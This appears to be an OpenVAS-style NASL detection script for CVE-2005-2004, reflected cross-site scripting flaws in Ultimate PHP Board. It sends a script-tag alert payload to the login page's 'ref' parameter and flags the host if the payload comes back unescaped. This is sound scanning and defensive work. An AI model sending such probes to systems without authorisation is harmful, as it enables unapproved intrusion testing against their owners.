if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.19498" );
	script_version( "2021-05-17T09:15:04+0000" );
	script_tag( name: "last_modification", value: "2021-05-17 09:15:04 +0000 (Mon, 17 May 2021)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_cve_id( "CVE-2005-2004" );
	script_bugtraq_id( 13971 );
	script_xref( name: "OSVDB", value: "17362" );
	script_xref( name: "OSVDB", value: "17363" );
	script_xref( name: "OSVDB", value: "17364" );
	script_xref( name: "OSVDB", value: "17365" );
	script_xref( name: "OSVDB", value: "17366" );
	script_xref( name: "OSVDB", value: "17367" );
	script_xref( name: "OSVDB", value: "17368" );
	script_xref( name: "OSVDB", value: "17369" );
	script_xref( name: "OSVDB", value: "17370" );
	script_xref( name: "OSVDB", value: "17371" );
	script_xref( name: "OSVDB", value: "17372" );
	script_xref( name: "OSVDB", value: "17373" );
	script_xref( name: "OSVDB", value: "17374" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:P/A:N" );
	script_name( "Ultimate PHP Board multiple XSS flaws" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2005 Josh Zlatin-Amishav" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "cross_site_scripting.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.myupb.com/forum/viewtopic.php?id=26&t_id=118" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/archive/1/402461" );
	script_tag( name: "solution", value: "Install vendor patch." );
	script_tag( name: "summary", value: "The remote version of Ultimate PHP Board (UPB) is affected
  by several cross-site scripting vulnerabilities. These issues are due to a failure of the
  application to properly sanitize user-supplied input." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod", value: "50" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("url_func.inc.sc");
require("misc_func.inc.sc");
vtstrings = get_vt_strings();
xss = "'><script>alert(" + vtstrings["lowercase_rand"] + ")</script>";
exss = urlencode( str: xss );
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
if(http_get_has_generic_xss( port: port, host: host )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/login.php?ref=", exss );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, xss )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

